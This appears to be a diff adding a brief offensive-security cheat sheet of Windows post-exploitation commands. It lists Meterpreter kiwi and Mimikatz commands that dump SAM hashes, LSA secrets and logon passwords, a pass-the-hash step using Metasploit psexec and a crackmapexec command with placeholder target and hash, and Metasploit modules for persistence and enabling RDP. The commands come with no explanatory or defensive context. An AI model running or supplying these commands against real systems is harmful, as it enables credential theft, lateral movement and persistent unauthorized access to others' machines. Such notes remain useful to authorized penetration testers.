@@ -1,0 +1,24 @@
+# Credential dumping 
+    # meterpreter
+    load kiwi
+    creds_all
+    lsa_dump_sam
+    lsa_dump_secrets
+
+    # Mimikatz 
+    privilege::debug
+    lsadump::sam
+    lsadump::secrets
+    sekurlsa::logonPasswords
+
+
+# Pass the hash
+    # Metasploit module
+    exploit/windows/smb/psexec
+
+    # crackmapexec
+    crackmapexec smb <TARGET_IP> -u Administrator -H "<NTLM_HASH>" -x "whoami"
+
+# Metasploit persistence
+    exploit/windows/local/persistence_service
+    post/windows/manage/enable_rdp
